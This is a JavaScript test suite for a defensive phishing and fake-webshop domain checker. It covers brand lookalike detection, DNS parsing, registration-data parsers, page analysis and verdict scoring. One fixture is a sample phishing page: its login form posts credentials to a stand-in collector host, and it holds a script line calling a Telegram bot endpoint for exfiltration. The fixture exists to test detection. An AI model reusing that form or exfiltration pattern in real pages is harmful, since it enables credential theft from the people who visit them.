import { test } from 'node:test';
import assert from 'node:assert/strict';

import { parseTarget, registrableOf, scriptsOf } from '../lib/target.mjs';
import { BRANDS, lookalikes, officialBrand, skeleton, editDistance, brandsNamed, lureWords } from '../lib/brands.mjs';
import { buildQuery, parseResponse, protectiveDns } from '../lib/dns.mjs';
import { parseRdap, parseCrtSh, whoisCreated, matchFeed, parseTrustpilot, whoisLookup } from '../lib/sources.mjs';
import { analyzePage } from '../lib/page.mjs';
import { judge, decide } from '../lib/verdict.mjs';
import { parseArgs, run, summary, resolveBrand } from '../check.mjs';

// ---------------------------------------------------------------- Targets

test('parseTarget finds the registrable domain, subdomain and shared hosts', () => {
  const t = parseTarget('https://PayPal.com.verify-acc.xyz/login?x=1');
  assert.equal(t.host, 'paypal.com.verify-acc.xyz');
  assert.equal(t.domain, 'verify-acc.xyz');
  assert.equal(t.label, 'verify-acc');
  assert.equal(t.subdomain, 'paypal.com');
  assert.equal(t.path, '/login?x=1');
  assert.equal(registrableOf('shop.example.co.uk'), 'example.co.uk');
  const v = parseTarget('netflix-trial.vercel.app');
  assert.equal(v.sharedHost, 'vercel.app');
  assert.equal(v.ownerName, 'netflix-trial.vercel.app');
  assert.equal(parseTarget('https://bit.ly/abc').shortener, true);
  assert.equal(parseTarget('https://sites.google.com/view/x').sharedPage, true);
  assert.throws(() => parseTarget('ftp://x.dk'));
  assert.throws(() => parseTarget('localhost'));
});

test('punycode names decode and mixed scripts are seen', () => {
  const t = parseTarget('xn--pypal-4ve.com'); // pаypal with a Cyrillic а
  assert.equal(t.punycode, true);
  assert.equal(t.unicodeHost, 'pаypal.com');
  assert.deepEqual(scriptsOf('pаypal').sort(), ['Cyrillic', 'Latin']);
});

// ---------------------------------------------------------------- Lookalikes

const kinds = (input) => lookalikes(parseTarget(input)).map((l) => `${l.brand}:${l.kind}:${l.strength}`);

test('lookalikes catch typos, homoglyphs, combos and brand subdomains', () => {
  assert.ok(kinds('paypa1.com').includes('PayPal:homoglyph:high'));
  assert.ok(kinds('paypall.com').includes('PayPal:typo:high'));
  assert.ok(kinds('rnicrosoft.com').includes('Microsoft:homoglyph:high'));
  assert.ok(kinds('xn--pypal-4ve.com').includes('PayPal:homoglyph:high'));
  assert.ok(kinds('apple-support-login.xyz').includes('Apple:combo:high') || kinds('apple-support-login.xyz').includes('Apple:combo:medium'));
  assert.ok(kinds('paypal-secure-login.com').includes('PayPal:combo:high'));
  assert.ok(kinds('postnord-levering.com').includes('PostNord:combo:high'));
  assert.ok(kinds('paypal.com.verify-account.xyz').includes('PayPal:subdomain:high'));
  assert.ok(kinds('www.facebook.webmau.vn').includes('Meta:subdomain:high'));
  assert.ok(kinds('netflix-trial.vercel.app').includes('Netflix:combo:high'));
  assert.ok(kinds('applegiftreward.vercel.app').includes('Apple:combo:high'));
  assert.ok(kinds('uspss.pages.dev').includes('USPS:typo:high'));
  assert.ok(kinds('mitid-login.dk').includes('MitID:combo:medium') || kinds('mitid-login.dk').includes('MitID:combo:high'));
  assert.ok(kinds('paypal.shop').includes('PayPal:other-tld:medium'));
});

test('lookalikes leave official and unrelated domains alone', () => {
  for (const d of ['paypal.com', 'www.paypal.com', 'postnord.dk', 'apple.com', 'support.apple.com', 'apple.dk', 'login.microsoftonline.com', 'example.dk', 'dr.dk', 'nordnet.dk', 'elgiganten.dk', 'pineapple.dk', 'skatepark.dk', 'stoumann.dk', 'github.com', 'mads.github.io']) {
    assert.deepEqual(kinds(d), [], d);
  }
  assert.equal(officialBrand(parseTarget('www.paypal.com')).how, 'listed');
  assert.equal(officialBrand(parseTarget('apple.dk')).how, 'country');
  assert.equal(officialBrand(parseTarget('apple.xyz')), null);
});

test('skeleton, editDistance and lure words', () => {
  assert.equal(skeleton('pаypa1'), 'paypal');
  assert.equal(skeleton('Øresund'), 'oresund');
  assert.equal(editDistance('paypal', 'paypla'), 1);
  assert.equal(editDistance('paypal', 'apple', 3), 4);
  assert.deepEqual(lureWords(parseTarget('secure.paypal-login.com')).sort(), ['login', 'secure']);
  assert.deepEqual(brandsNamed('Log in to your PayPal account').map((b) => b.name), ['PayPal']);
  assert.deepEqual(brandsNamed('Pineapple recipes'), []);
  assert.ok(BRANDS.length > 120);
});

// ---------------------------------------------------------------- DNS wire format

/** A DNS response for name with the given A records or rcode. */
function dnsResponse(name, { a = [], rcode = 0, txt = [] } = {}) {
  const q = buildQuery(name, txt.length ? 'TXT' : 'A');
  const answers = [];
  for (const ip of a) answers.push(Buffer.concat([Buffer.from([0xc0, 12, 0, 1, 0, 1, 0, 0, 0, 60, 0, 4]), Buffer.from(ip.split('.').map(Number))]));
  for (const t of txt) { const s = Buffer.from(t); answers.push(Buffer.concat([Buffer.from([0xc0, 12, 0, 16, 0, 1, 0, 0, 0, 60, 0, s.length + 1, s.length]), s])); }
  const head = Buffer.from(q);
  head.writeUInt16BE(0x8180 | rcode, 2);
  head.writeUInt16BE(answers.length, 6);
  return Buffer.concat([head, ...answers]);
}

test('DNS queries and answers round-trip', () => {
  const r = parseResponse(dnsResponse('example.com', { a: ['1.2.3.4', '5.6.7.8'] }));
  assert.equal(r.rcode, 'NOERROR');
  assert.deepEqual(r.answers.map((x) => [x.name, x.type, x.data]), [['example.com', 'A', '1.2.3.4'], ['example.com', 'A', '5.6.7.8']]);
  assert.equal(parseResponse(dnsResponse('nope.example', { rcode: 3 })).rcode, 'NXDOMAIN');
  assert.equal(parseResponse(dnsResponse('x.example', { txt: ['13335 | 1.1.1.0/24 | US'] })).answers[0].data, '13335 | 1.1.1.0/24 | US');
});

test('protectiveDns reads Quad9 NXDOMAIN and Cloudflare 0.0.0.0 as blocks', async () => {
  const answers = { cloudflare: { rcode: 'NOERROR', answers: [{ type: 'A', data: '9.9.9.9' }] }, quad9: { rcode: 'NXDOMAIN', answers: [] }, quad9Unfiltered: { rcode: 'NOERROR', answers: [{ type: 'A', data: '9.9.9.9' }] }, cloudflareSecurity: { rcode: 'NOERROR', answers: [{ type: 'A', data: '0.0.0.0' }] } };
  const r = await protectiveDns('bad.example', { query: async (n, t, which) => answers[which] });
  assert.deepEqual(r.blockedBy, ['Quad9', 'Cloudflare Security DNS']);
  const clean = { ...answers, quad9: answers.quad9Unfiltered, cloudflareSecurity: answers.cloudflare };
  assert.deepEqual((await protectiveDns('ok.example', { query: async (n, t, which) => clean[which] })).blockedBy, []);
  // A name that does not exist is not "blocked" by Quad9.
  const gone = { cloudflare: { rcode: 'NXDOMAIN', answers: [] }, quad9: { rcode: 'NXDOMAIN', answers: [] }, quad9Unfiltered: { rcode: 'NXDOMAIN', answers: [] }, cloudflareSecurity: { rcode: 'NXDOMAIN', answers: [] } };
  assert.deepEqual((await protectiveDns('gone.example', { query: async (n, t, which) => gone[which] })).blockedBy, []);
});

// ---------------------------------------------------------------- Sources

test('parsers for RDAP, crt.sh, whois, OpenPhish and Trustpilot', () => {
  const r = parseRdap({ events: [{ eventAction: 'registration', eventDate: '2026-10-31T00:00:00Z' }], status: ['client hold'], entities: [{ roles: ['registrar'], vcardArray: ['vcard', [['fn', {}, 'text', 'NameCheap, Inc.']]] }] });
  assert.equal(r.created, '2026-10-31T00:00:00Z');
  assert.equal(r.registrar, 'NameCheap, Inc.');
  assert.deepEqual(r.status, ['client hold']);
  const ct = parseCrtSh([{ not_before: '2020-01-02T00:00:00' }, { not_before: '2018-05-06T00:00:00' }], new Date('2026-11-01'));
  assert.equal(ct.firstSeen, '2018-05-06T00:00:00.000Z');
  assert.equal(ct.certs, 2);
  assert.equal(whoisCreated('Domain: example.dk\nRegistered:          1998-01-21\n').slice(0, 10), '1998-01-21');
  assert.equal(whoisCreated('Creation Date: 1999-07-15T05:32:11Z').slice(0, 10), '1999-07-15');
  assert.equal(whoisCreated('nothing here'), null);
  const feed = 'https://netflix-trial.vercel.app/\nhttps://paypal.com.evil.xyz/x\nhttps://other.vercel.app/\n';
  assert.deepEqual(matchFeed(feed, parseTarget('netflix-trial.vercel.app')), ['https://netflix-trial.vercel.app/']);
  assert.deepEqual(matchFeed(feed, parseTarget('evil.xyz')), ['https://paypal.com.evil.xyz/x']);
  assert.deepEqual(matchFeed(feed, parseTarget('vercel.app')), []);
  const tp = parseTrustpilot('<script type="application/ld+json">{"@graph":[{"@type":"Organization","name":"Shop","aggregateRating":{"ratingValue":"4.6","reviewCount":"1234"}}]}</script>');
  assert.deepEqual(tp, { found: true, name: 'Shop', rating: 4.6, reviews: 1234 });
  assert.equal(parseTrustpilot('<html></html>').found, false);
});

test('whoisLookup asks the TLD whois server and falls back to the binary', async () => {
  const asked = [];
  const r = await whoisLookup('example.dk', { now: new Date('2026-11-01'), query: async (server, q) => { asked.push(server); return 'Registered: 1998-01-21\n'; } });
  assert.equal(r.ok, true);
  assert.deepEqual(asked, ['whois.punktum.dk']);
  const r2 = await whoisLookup('x.io', { query: async () => { throw new Error('port 43 blocked'); }, exec: async () => 'Creation Date: 2020-02-02' });
  assert.equal(r2.created.slice(0, 10), '2020-02-02');
});

// ---------------------------------------------------------------- Page

const PHISH = `<html><head><title>PayPal: Log in</title><link rel="icon" href="/fav.ico"></head><body>
<h1>Your account has been limited</h1>
<form action="https://collector.example.net/p.php" method="post"><input type="email" name="user"><input type="password" name="pass"></form>
<img src="https://www.paypalobjects.com/a.png"><img src="https://www.paypalobjects.com/b.png"><script src="https://www.paypalobjects.com/c.js"></script>
<script>fetch('https://api.telegram.org/bot123:abc/sendMessage')</script></body></html>`;

test('analyzePage finds credential fields, offsite forms, exfiltration and borrowed files', () => {
  const p = analyzePage(PHISH, 'https://paypa1-secure.com/login');
  assert.equal(p.title, 'PayPal: Log in');
  assert.equal(p.password, true);
  assert.deepEqual(p.offsiteForms, ['https://collector.example.net/p.php']);
  assert.ok(p.exfil.some((x) => /telegram/.test(x)));
  assert.equal(p.resourceHosts['paypalobjects.com'], 3);
  assert.equal(p.favicon, 'https://paypa1-secure.com/fav.ico');
  assert.match(p.urgency, /account has been limited/);
});

test('analyzePage reads webshop signals', () => {
  const html = `<html><head><title>Billige sko</title></head><body><button>Læg i kurv</button>
    <p>-70% -80% -75% -90% -60% på alt!</p><p>Kontakt: billigsko@gmail.com</p><p>Betaling: kun bankoverførsel</p></body></html>`;
  const p = analyzePage(html, 'https://billige-sko.shop/');
  assert.equal(p.shop, true);
  assert.deepEqual(p.freeMail, ['billigsko@gmail.com']);
  assert.equal(p.pay.bankTransferOnly, true);
  assert.equal(p.discount, 5);
  assert.deepEqual(p.cvr, []);
  const legit = analyzePage('<p>Læg i kurv</p><footer>CVR-nr. 12 34 56 78 · Handelsbetingelser · Returnering</footer>', 'https://shop.dk/');
  assert.deepEqual(legit.cvr, ['12345678']);
});

// ---------------------------------------------------------------- Verdict

const base = (input, extra = {}) => ({ target: parseTarget(input), official: officialBrand(parseTarget(input)), lookalikes: lookalikes(parseTarget(input)), lures: lureWords(parseTarget(input)), ...extra });

test('a blocklist hit is Dangerous whatever else looks good', () => {
  const r = judge(base('old-site.dk', { registration: { ok: true, created: '2001-01-01', ageDays: 9000, status: [] }, tranco: { ok: true, rank: 5000 }, protective: { ok: true, checked: ['Quad9'], blockedBy: ['Quad9'] } }));
  assert.equal(r.verdict, 'dangerous');
  assert.ok(r.score <= 10);
});

test('a young lookalike is Dangerous even with clean blocklists and an empty page', () => {
  const r = judge(base('paypa1-login.com', { registration: { ok: true, created: '2026-10-27', ageDays: 5, status: [] }, protective: { ok: true, checked: ['Quad9'], blockedBy: [] } }));
  assert.equal(r.verdict, 'dangerous');
  assert.equal(r.signals[0].id, 'lookalike.combo');
});

test('a page claiming a brand and asking for a password on an unrelated domain is Dangerous', () => {
  const page = { ok: true, ...analyzePage(PHISH, 'https://old-blog.example/wp/') };
  const r = judge(base('old-blog.example', { registration: { ok: true, created: '2010-01-01', ageDays: 6000, status: [] }, page, pageBrands: brandsNamed(page.title) }));
  assert.equal(r.verdict, 'dangerous');
  assert.ok(r.signals.some((s) => s.id === 'brand.claimed' || s.id === 'page.exfil'));
});

test('the official domain is Trusted; a new honest-looking shop is Unknown, not safe or dangerous', () => {
  assert.equal(judge(base('paypal.com', { registration: { ok: true, created: '1999-07-15', ageDays: 9900, status: [] }, tranco: { ok: true, rank: 166 } })).verdict, 'trusted');
  const shop = { ok: true, ...analyzePage('<title>Lille Butik</title><p>Læg i kurv</p><footer>CVR 12345678 · Handelsbetingelser · Returnering · Visa, Dankort, MobilePay</footer>', 'https://lillebutik.dk/') };
  const r = judge(base('lillebutik.dk', { registration: { ok: true, created: '2026-06-01', ageDays: 150, status: [] }, page: shop, pageBrands: [] }));
  assert.equal(r.verdict, 'unknown');
});

test('a fake shop collects enough warnings to be Suspicious', () => {
  const page = { ok: true, ...analyzePage('<title>Billige sko</title><p>Læg i kurv -70% -80% -75% -90% -60%</p><p>billigsko@gmail.com, kun bankoverførsel</p>', 'https://billige-sko.shop/') };
  const r = judge(base('billige-sko.shop', { registration: { ok: true, created: '2026-10-20', ageDays: 12, status: [] }, page, pageBrands: [] }));
  assert.equal(r.verdict, 'suspicious');
});

test('a lookalike name on a top-100k site is only noted', () => {
  const r = judge(base('applebees.com', { registration: { ok: true, created: '1995-07-20', ageDays: 11400, status: [] }, tranco: { ok: true, rank: 30000 } }));
  assert.ok(['trusted', 'likely-safe'].includes(r.verdict), r.verdict);
});

test('decide caps the score by verdict', () => {
  const r = decide([{ id: 'x', level: 'warn', title: 'x', evidence: '', weight: 25 }, { id: 'age', level: 'good', title: 'y', evidence: '', weight: 40 }]);
  assert.equal(r.verdict, 'suspicious');
  assert.ok(r.score <= 35);
});

// ---------------------------------------------------------------- End to end, offline

function fakeFetch(routes) {
  return async (url, opts = {}) => {
    const u = String(url);
    for (const [re, handler] of routes) {
      if (re.test(u)) {
        const r = typeof handler === 'function' ? handler(u, opts) : handler;
        const body = r.body ?? '';
        return new Response(typeof body === 'string' || body instanceof Uint8Array ? body : JSON.stringify(body), { status: r.status || 200, headers: r.headers || { 'content-type': typeof body === 'object' && !(body instanceof Uint8Array) ? 'application/json' : 'text/html' } });
      }
    }
    throw new Error(`offline: ${u}`);
  };
}

function dnsRoute(blocked = false) {
  return (u) => {
    const q = Buffer.from(new URL(u).searchParams.get('dns').replace(/-/g, '+').replace(/_/g, '/'), 'base64');
    // The question name from the query.
    let o = 12; const labels = [];
    while (q[o]) { labels.push(q.toString('latin1', o + 1, o + 1 + q[o])); o += q[o] + 1; }
    const host = labels.join('.');
    const security = /security\.cloudflare|dns\.quad9\.net\//.test(u) && !/dns10/.test(u);
    if (blocked && security) return /quad9/.test(u) ? { body: new Uint8Array(dnsResponse(host, { rcode: 3 })), headers: { 'content-type': 'application/dns-message' } } : { body: new Uint8Array(dnsResponse(host, { a: ['0.0.0.0'] })), headers: { 'content-type': 'application/dns-message' } };
    if (/cymru/.test(host)) return { body: new Uint8Array(dnsResponse(host, { txt: [/^AS/i.test(host) ? '64500 | DK | ripencc | 2001-01-01 | EXAMPLE-AS, DK' : '64500 | 192.0.2.0/24 | DK | ripencc | 2001-01-01'] })), headers: { 'content-type': 'application/dns-message' } };
    return { body: new Uint8Array(dnsResponse(host, { a: ['192.0.2.10'] })), headers: { 'content-type': 'application/dns-message' } };
  };
}

test('run() on an offline lookalike gives Dangerous with the real site named', async () => {
  const now = new Date('2026-11-01T12:00:00Z');
  const f = fakeFetch([
    [/dns-query/, dnsRoute(false)],
    [/rdap\.org/, { body: { events: [{ eventAction: 'registration', eventDate: '2026-10-29T10:00:00Z' }], status: ['active'], entities: [] } }],
    [/crt\.sh/, { body: [{ not_before: '2026-10-29T11:00:00' }] }],
    [/archive\.org/, { body: { archived_snapshots: {} } }],
    [/tranco/, { body: { ranks: [] } }],
    [/openphish/, { body: 'https://elsewhere.example/\n', headers: { 'content-type': 'text/plain' } }],
    [/urlscan/, { body: { total: 0, results: [] } }],
    [/trustpilot/, { status: 404, body: '' }],
    [/paypa1-secure\.com\/fav\.ico/, { body: new Uint8Array(Buffer.from('ICON'.repeat(30))), headers: { 'content-type': 'image/x-icon' } }],
    [/paypa1-secure\.com/, { body: PHISH }],
    [/paypal\.com/, { body: '<link rel="icon" href="/favicon.ico">' }],
  ]);
  const r = await run({ input: 'https://paypa1-secure.com/login', page: true }, { fetch: f, now, env: {}, exec: async () => '', whoisQuery: async () => '' });
  assert.equal(r.verdict, 'dangerous');
  assert.ok(r.signals.some((s) => s.id.startsWith('lookalike') && /paypal\.com/.test(s.evidence)));
  assert.ok(r.signals.some((s) => s.id === 'page.exfil'));
  assert.deepEqual(r.keysMissing.sort(), ['no GOOGLE_SAFE_BROWSING_KEY', 'no URLHAUS_AUTH_KEY', 'no VIRUSTOTAL_API_KEY']);
  const text = summary(r);
  assert.match(text, /^paypa1-secure\.com\nVerdict: Dangerous/);
});

test('run() with --brand flags a site that is not the expected one', async () => {
  const f = fakeFetch([
    [/dns-query/, dnsRoute(false)],
    [/rdap\.org/, { body: { events: [{ eventAction: 'registration', eventDate: '2015-01-01T00:00:00Z' }], status: [], entities: [] } }],
    [/crt\.sh/, { body: [] }], [/archive\.org/, { body: {} }], [/tranco/, { body: { ranks: [] } }],
    [/openphish/, { body: '' }], [/urlscan/, { body: { total: 0, results: [] } }], [/trustpilot/, { status: 403, body: '' }],
    [/pakke-status\.dk/, { body: '<title>Track your parcel</title>' }],
  ]);
  const r = await run({ input: 'pakke-status.dk', brand: 'postnord.dk', page: true }, { fetch: f, env: {}, now: new Date('2026-11-01') });
  assert.equal(r.verdict, 'dangerous');
  assert.equal(r.signals[0].id, 'brand.expected');
  assert.ok(r.unavailable.some((u) => /Trustpilot/.test(u)));
});

test('resolveBrand takes listed brands, domains and Wikidata names', async () => {
  assert.equal((await resolveBrand('PostNord')).brand.name, 'PostNord');
  assert.deepEqual((await resolveBrand('www.mybank.dk')).brand.domains, ['mybank.dk']);
  const wd = await resolveBrand('Some Bank', { wikidata: async () => ({ ok: true, label: 'Some Bank', sites: ['www.somebank.se'] }) });
  assert.deepEqual(wd.brand.domains, ['somebank.se']);
});

test('parseArgs', () => {
  assert.deepEqual(parseArgs(['x.dk', '--brand', 'PostNord', '--json']), { brand: 'PostNord', page: true, json: true, input: 'x.dk' });
  assert.equal(parseArgs(['x.dk', '--no-page']).page, false);
  assert.throws(() => parseArgs(['x.dk', '--nope']));
});
